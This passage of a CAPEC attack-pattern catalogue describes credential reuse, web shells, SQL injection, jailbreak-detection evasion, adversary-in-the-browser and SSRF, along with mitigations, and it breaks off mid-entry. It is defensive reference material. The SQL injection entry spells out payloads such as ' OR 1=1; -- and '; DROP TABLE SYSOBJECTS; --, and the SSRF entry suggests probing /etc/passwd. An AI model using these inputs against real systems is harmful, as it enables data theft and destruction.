CAPEC-65,Sniff Application Code,Detailed,Draft,"An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:157::NATURE:CanPrecede:CAPEC ID:37::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Set up a sniffer] The adversary sets up a sniffer in the path between the server and the client and watches the traffic.TECHNIQUE:The adversary sets up a sniffer in the path between the server and the client.::STEP:2:PHASE:Exploit:DESCRIPTION:[Capturing Application Code Bound During Patching]adversary knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The adversary loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The adversary then proceeds to reverse engineer the captured code.TECHNIQUE:adversary loads the sniffer to capture the application code bound during a dynamic update.:TECHNIQUE:The adversary proceeds to reverse engineer the captured code.::","::The attacker must have the ability to place themself in the communication path between the client and server.::The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.::The attacker must be able to employ a sniffer on the network without being detected.::","::SKILL:The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ an adversary-in-the-middle attack (CAPEC-94), the client or server must not realize this. Finally, the attacker needs to regenerate source code from binary code if the need be.:LEVEL:Medium::",::The Attacker needs the ability to capture communications between the client being updated and the server providing the update. In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Design: Encrypt all communication between the client and server.::Implementation: Use SSL, SSH, SCP.::Operation: Use ifconfig/ipconfig or other tools to detect the sniffer installed in the network.::","::Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..::Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such.::",::319::311::318::693::,N/A,N/A,https://capec.mitre.org/data/definitions/65.html
CAPEC-650,Upload a Web Shell to a Web Server,Detailed,Draft,"By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a gateway to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:17::,N/A,::The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::,"::Make sure your web server is up-to-date with all patches to protect against known vulnerabilities.::Ensure that the file permissions in directories on the web server from which files can be execute is set to the least privilege settings, and that those directories contents is controlled by an allowlist.::",N/A,::287::553::,TAXONOMY NAME:ATTACK:ENTRY ID:1505.003:ENTRY NAME:Server Software Component:Web Shell::,N/A,https://capec.mitre.org/data/definitions/650.html
CAPEC-651,Eavesdropping,Standard,Draft,"An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:117::,N/A,"::The adversary typically requires physical proximity to the target's environment, whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping, if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally.::",N/A,"::For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other The adversary gains unauthorized access to information.::,"::Be mindful of your surroundings when discussing sensitive information in public areas.::Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity, and implement patches as soon as they become available.::If possible, physically disable the microphone on your machine if it is not needed.::",N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/651.html
CAPEC-652,Use of Known Kerberos Credentials,Standard,Draft,"An adversary obtains (i.e. steals or purchases) legitimate Kerberos credentials (e.g. Kerberos service account userID/password or Kerberos Tickets) with the goal of achieving authenticated access to additional systems, applications, or services within the domain.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Kerberos credentials] The adversary must obtain known Kerberos credentials in order to access the target system, application, or service within the domain.TECHNIQUE:An adversary purchases breached Kerberos service account username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary guesses the credentials to a weak Kerberos service account.:TECHNIQUE:An adversary conducts a sniffing attack to steal Kerberos tickets as they are transmitted.:TECHNIQUE:An adversary conducts a Kerberoasting attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt Kerberos authentication] Try each Kerberos credential against various resources within the domain until the target grants access.TECHNIQUE:Manually or automatically enter each Kerberos service account credential through the target's interface.:TECHNIQUE:Attempt a Pass the Ticket attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::","::The system/application is connected to the Windows domain and leverages Kerberos authentication.::The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication for Kerberos service accounts.::The system/application does not have a sound password policy that is being enforced for Kerberos service accounts.::The system/application does not implement an effective password throttling mechanism for authenticating to Kerberos service accounts.::The targeted network allows for network sniffing attacks to succeed.::","::SKILL:Once an adversary obtains a known Kerberos credential, leveraging it is trivial.:LEVEL:Low::",::A valid Kerberos ticket or a known Kerberos service account credential.::,::Authentication attempts use expired or invalid credentials.::Authentication attempts are originating from IP addresses or locations that are inconsistent with an account's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Create a strong password policy and ensure that your system enforces this policy for Kerberos service accounts.::Ensure Kerberos service accounts are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse Kerberos service account credentials across systems.::Deny remote use of Kerberos service account credentials to log into domain systems.::Do not allow Kerberos service accounts to be a local administrator on more than one system.::Enable at least AES Kerberos encryption for tickets.::Monitor system and domain logs for abnormal credential access.::","::Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::",::522::307::308::309::262::263::654::294::836::,TAXONOMY NAME:ATTACK:ENTRY ID:1558:ENTRY NAME:Steal or Forge Kerberos Tickets::,"TYPE:Other:NOTE:Kerberos centers around a ticketing system that is used to request/grant access to resources and to then access the requested resources. If one of these tickets is acquired, an adversary could gain access to a specific resource; access any resource a user has privileges to access; gain access to services that use Kerberos as an authentication mechanism and generate tickets to access a particular resource and the system that hosts the resource; or generate Ticket Granting Tickets (TGTs) for any domain account within Active Directory.::",https://capec.mitre.org/data/definitions/652.html
CAPEC-653,Use of Known Windows Credentials,Standard,Draft,"An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows domain credentials (e.g. userID/password) to achieve authentication and to perform authorized actions on the domain, under the guise of an authenticated user or service. Attacks leveraging trusted Windows credentials typically result in the adversary laterally moving within the local Windows network, since users are often allowed to login to systems/applications within the domain using their Windows domain password. This domain authentication can occur directly (user typing in their password or PIN) or via Single Sign-On (SSO) or cloud-based authentication, which often don't verify the authenticity of the user's input.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows credentials] The adversary must obtain known Windows credentials in order to access the target system, application, or service within the domain.TECHNIQUE:An adversary purchases breached Windows username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows credential against various systems, applications, and services within the domain until the target grants access.TECHNIQUE:Manually or automatically enter each credential through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::","::The system/application is connected to the Windows domain.::The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known Windows user accounts and corresponding passwords that may exist on the target.::","::SKILL:Once an adversary obtains a known Windows credential, leveraging it is trivial.:LEVEL:Low::",::A list of known Windows credentials for the targeted domain.::A custom script that leverages a Windows credential list to launch an attack.::,::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with a user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::","::Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credentials from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]::Mimikatz, a post-exploitation Windows credential harvester, can be used to gather and exploit Windows credentials. This malware has been used in several known cyberattacks, such as the Petya Ransomeware attacks. [REF-576]::",::522::307::308::309::262::263::654::,N/A,N/A,https://capec.mitre.org/data/definitions/653.html
CAPEC-654,Credential Prompt Impersonation,Detailed,Stable,"An adversary, through a previously installed malicious application, impersonates a credential prompt in an attempt to steal a user's credentials.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:504::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing their credentials.TECHNIQUE:Determine what tasks prompt a user for their credentials.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials.TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.::",::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::,"::SKILL:Once an adversary has gained access to the target system, impersonating a credential prompt is not difficult.:LEVEL:Low::",::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate credential prompt.::,::Credential prompts that appear illegitimate or unexpected.::,::SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::,"::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::","::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary randomly prompts a user to enter their system credentials, tricking the user into believing that a background process requires the credentials to function. The adversary can then use these gleaned credentials to execute additional attacks or obtain data.::",::1021::,N/A,N/A,https://capec.mitre.org/data/definitions/654.html
CAPEC-657,Malicious Automated Software Update via Spoofing,Detailed,Draft,"An attackers uses identify or content spoofing to trick a client into performing an automated software update from a malicious source. A malicious automated software update that leverages spoofing can include content or identity spoofing as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. The result is the client believing there is a legitimate software update available but instead downloading a malicious update from the attacker.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:186::,N/A,N/A,N/A,N/A,N/A,::SCOPE:Access Control:SCOPE:Availability:SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands::,N/A,::An example of the spoofing strategy would be the eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.::,::494::,TAXONOMY NAME:ATTACK:ENTRY ID:1017:ENTRY NAME:Application Deployment Software::,N/A,https://capec.mitre.org/data/definitions/657.html
CAPEC-66,SQL Injection,Standard,Draft,"This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] The attacker first takes an inventory of the functionality exposed by the application.TECHNIQUE:Spider web sites for all available links:TECHNIQUE:Sniff network communications with application using a utility such as WireShark.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:[Experiment with SQL Injection vulnerabilities] After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.TECHNIQUE:Use public resources such as SQL Injection Cheat Sheet at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.:TECHNIQUE:Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : ' OR 1=1; --, or something else that would syntactically complete a hypothesized query. Iteratively refine the query.:TECHNIQUE:Use Blind SQL Injection techniques to extract information about the database schema.:TECHNIQUE:If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: '; DROP TABLE SYSOBJECTS; -- and '); DROP TABLE SYSOBJECTS; --. These particular queries will likely not work because the SYSOBJECTS table is generally protected.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.TECHNIQUE:Craft and Execute underlying SQL query::","::SQL queries used by the application to store, retrieve or modify data.::User-controllable input that is not properly validated by the application as part of SQL queries.::","::SKILL:It is fairly simple for someone with basic SQL knowledge to perform SQL injection, in general. In certain instances, however, specific knowledge of the database employed may be required.:LEVEL:Low::",::None: No specialized resources are required to execute this type of attack.::,"::Too many false or invalid queries to the database, especially those caused by malformed input.::",::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.::Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::","::With PHP-Nuke versions 7.9 and earlier, an attacker can successfully access and modify data, including sensitive contents such as usernames and password hashes, and compromise the application through SQL Injection. The protection mechanism against SQL Injection employs a denylist approach to input validation. However, because of an improper denylist, it is possible to inject content such as foo'/**/UNION or foo UNION/**/ to bypass validation and glean sensitive information from the database. See also: CVE-2006-5525::",::89::1286::,TAXONOMY NAME:WASC:ENTRY ID:19:ENTRY NAME:SQL Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:SQL Injection::,N/A,https://capec.mitre.org/data/definitions/66.html
CAPEC-660,Root/Jailbreak Detection Evasion via Hooking,Detailed,Stable,"An adversary forces a non-restricted mobile application to load arbitrary code or code files, via Hooking, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Adversaries may further leverage these capabilities to escalate privileges or bypass access control on legitimate applications. Although many mobile applications check if a mobile device is Rooted/Jailbroken prior to authorized use of the application, adversaries may be able to hook code in order to circumvent these checks. Successfully evading Root/Jailbreak detection allows an adversary to execute administrative commands, obtain confidential data, impersonate legitimate users of the application, and more.",N/A,Medium,Very High,::NATURE:ChildOf:CAPEC ID:251::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).TECHNIQUE:Search application stores for mobile applications worth exploiting::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop code to be hooked into chosen target application] The adversary develops code or leverages existing code that will be hooked into the target application in order to evade Root/Jailbreak detection methods.TECHNIQUE:Develop code or leverage existing code to bypass Root/Jailbreak detection methods.:TECHNIQUE:Test the code to see if it works.:TECHNIQUE:Iteratively develop the code until Root/Jailbreak detection methods are evaded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute code hooking to evade Root/Jailbreak detection methods] Once hooking code has been developed or obtained, execute the code against the target application to evade Root/Jailbreak detection methods.TECHNIQUE:Hook code into the target application.::",::The targeted application must be non-restricted to allow code hooking.::,::SKILL:Knowledge about Root/Jailbreak detection and evasion techniques.:LEVEL:High::SKILL:Knowledge about code hooking.:LEVEL:Medium::,::The adversary must have a Rooted/Jailbroken mobile device.::The adversary needs to have enough access to the target application to control the included code or file.::,N/A,"::SCOPE:Integrity:SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Authorization Execute Unauthorized Commands Through Root/Jailbreak Detection Evasion via Hooking, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Access ControlTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Access Control Read Data An adversary may leverage Root/Jailbreak Detection Evasion via Hooking in order to obtain sensitive information.::","::Ensure mobile applications are signed appropriately to avoid code inclusion via hooking.::Inspect the application's memory for suspicious artifacts, such as shared objects/JARs or dylibs, after other Root/Jailbreak detection methods.::Inspect the application's stack trace for suspicious method calls.::Allow legitimate native methods, and check for non-allowed native methods during Root/Jailbreak detection methods.::For iOS applications, ensure application methods do not originate from outside of Apple's SDK.::","::An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns false when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns false, so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.::An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users.::",::829::,TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::,N/A,https://capec.mitre.org/data/definitions/660.html
CAPEC-662,Adversary in the Browser (AiTB),Standard,Stable,"An adversary exploits security vulnerabilities or inherent functionalities of a web browser, in order to manipulate traffic between two endpoints. This attack first requires the adversary to trick the victim into installing a Trojan Horse application on their system, such as a malicious web browser plugin, which the adversary then leverages to mount the attack. The victim interacts with a web application, such as a banking website, in a normal manner and under the assumption that the connection is secure. However, the adversary can now alter and/or reroute traffic between the client application (e.g., web browser) and the coinciding endpoint, while simultaneously displaying intended transactions and data back to the user. The adversary may also be able to glean cookies, HTTP sessions, and SSL client certificates, which can be used to pivot into an authenticated intranet. Identifying AITB is often difficult because these attacks are successful even when security mechanisms such as SSL/PKI and multifactor authentication are present, since they still function as intended during the attack.",::TERM:Man in the Browser:DESCRIPTION:::TERM:Boy in the Browser:DESCRIPTION:::TERM:Man in the Mobile:DESCRIPTION:::,High,Very High,::NATURE:ChildOf:CAPEC ID:94::,"::STEP:1:PHASE:Experiment:DESCRIPTION:The adversary tricks the victim into installing the Trojan Horse malware onto their system.TECHNIQUE:Conduct phishing attacks, drive-by malware installations, or masquerade malicious browser extensions as being legitimate.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.::STEP:3:PHASE:Exploit:DESCRIPTION:The adversary observes, filters, or alters passed data of their choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.::","::The adversary must install or convince a user to install a Trojan.::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::Strong mutual authentication is not used between the two target components yielding opportunity for adversarial interposition.::For browser pivoting, the SeDebugPrivilege and a high-integrity process must both exist to execute this attack.::","::SKILL:Tricking the victim into installing the Trojan is often the most difficult aspect of this attack. Afterwards, the remainder of this attack is fairly trivial.:LEVEL:Medium::",N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Ensure software and applications are only downloaded from legitimate and reputable sources, in addition to conducting integrity checks on the downloaded component.::Leverage anti-malware tools, which can detect Trojan Horse malware.::Use strong, out-of-band mutual authentication to always fully authenticate both ends of any communications channel.::Limit user permissions to prevent browser pivoting.::Ensure browser sessions are regularly terminated and when their effective lifetime ends.::","::An adversary conducts a phishing attack and tricks a victim into installing a malicious browser plugin. The adversary then positions themself between the victim and their banking institution. The victim begins by initiating a funds transfer from their personal savings to their personal checking account. Using injected JavaScript, the adversary captures this request and modifies it to transfer an increased amount of funds to an account that they controls, before sending it to the bank. The bank processes the transfer and sends the confirmation notice back to the victim, which is instead intercepted by the adversary. The adversary modifies the confirmation to reflect the original transaction details and sends this modified message back to the victim. Upon receiving the confirmation, the victim assumes the transfer was successful and is unaware that their money has just been transferred to the adversary.::In 2020, the Agent Tesla malware was leveraged to conduct AiTB attacks against organizations within the gas, oil, and other energy sectors. The malware was delivered via a spearphishing campaign and has the capability to form-grab, keylog, copy clipboard data, extract credentials, and capture screenshots. [REF-630]::Boy in the browser attacks are a subset of AiTB attacks. Similar to AiTB attacks, the adversary must first trick the victim into installing a Trojan, either via social engineering or drive-by-download attacks. The malware then modifies the victim's hosts file in order to reroute web traffic from an intended website to an adversary-controlled website that mimics the legitimate website. The adversary is now able to observe, intercept, and/or modify all traffic, as in a traditional Adversary in the Middle attack (CAPEC-94). BiTB attacks are low-cost, easy to execute, and more difficult to detect since the malware often removes itself once the attack has concluded. [REF-631]::Man in the Mobile attacks are a subset of AiTB attacks that target mobile device users. Like AiTB attacks, an adversary convinces a victim to install a Trojan mobile application on their mobile device, often under the guise of security. Once the victim has installed the application, the adversary can capture all SMS traffic to bypass SMS-based out-of-band authentication systems. [REF-632]::",::300::494::,TAXONOMY NAME:ATTACK:ENTRY ID:1185:ENTRY NAME:Man in the Browser::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Man-in-the-browser attack::,N/A,https://capec.mitre.org/data/definitions/662.html
CAPEC-664,Server Side Request Forgery,Standard,Stable,"An adversary exploits improper input validation by submitting maliciously crafted input to a target application running on a server, with the goal of forcing the server to make a request either to itself, to web services running in the server’s internal network, or to external third parties. If successful, the adversary’s request will be made with the server’s privilege level, bypassing its authentication controls. This ultimately allows the adversary to access sensitive data, execute commands on the server’s network, and make external requests with the stolen identity of the server. Server Side Request Forgery attacks differ from Cross Site Request Forgery attacks in that they target the server itself, whereas CSRF attacks exploit an insecure user authentication mechanism to perform unauthorized actions on the user's behalf.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:115::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target application] Find target web application that accepts a user input and retrieves data from the server::STEP:2:PHASE:Experiment:DESCRIPTION:[Examine existing application requests] Examine HTTP/GET requests to view the URL query format. Adversaries test to see if this type of attack is possible through weaknesses in an application's protection to Server Side Request ForgeryTECHNIQUE:Attempt manipulating the URL to retrieve an error response/code from the server to determine if URL/request validation is done.:TECHNIQUE:Use a list of XSS probe strings to specify as parameters to known URLs. If possible, use probe strings with unique identifiers.:TECHNIQUE:Create a GET request with a common server file path such as /etc/passwd as a parameter and examine output.::STEP:3:PHASE:Exploit:DESCRIPTION:[Malicious request] Adversary crafts a malicious URL request that assumes the privilege level of the server to query internal or external network services and sends the request to the application::",::Server must be running a web application that processes HTTP requests.::,"::SKILL:The adversary will have to detect the vulnerability through an intermediary service or specify maliciously crafted URLs and analyze the server response.:LEVEL:Medium::SKILL:The adversary will be required to access internal resources, extract information, or leverage the services running on the server to perform unauthorized actions such as traversing the local network or routing a reflected TCP DDoS through them.:LEVEL:High::",::[None] No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:AvailabilityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::,"::Handling incoming requests securely is the first line of action to mitigate this vulnerability. This can be done through URL validation.::Further down the process flow, examining the response and verifying that it is as expected before sending would be another way to secure the server.::Allowlist the DNS name or IP address of every service the web application is required to access is another effective security measure. This ensures the server cannot make external requests to arbitrary services.::Requiring authentication for local services adds another layer of security between the adversary and internal services running on the server. By enforcing local authentication, an adversary will not gain access to all internal services only with access to the server.::Enforce the usage of relevant URL schemas. By limiting requests be made only through HTTP or HTTPS, for example, attacks made through insecure schemas such as file://, ftp://, etc. can be prevented.::","::An e-commerce website allows a customer to filter results by specific categories. When the customer selects the category of choice, the web shop queries a back-end service to retrieve the requested products. The request may look something like: POST /product/category HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 200 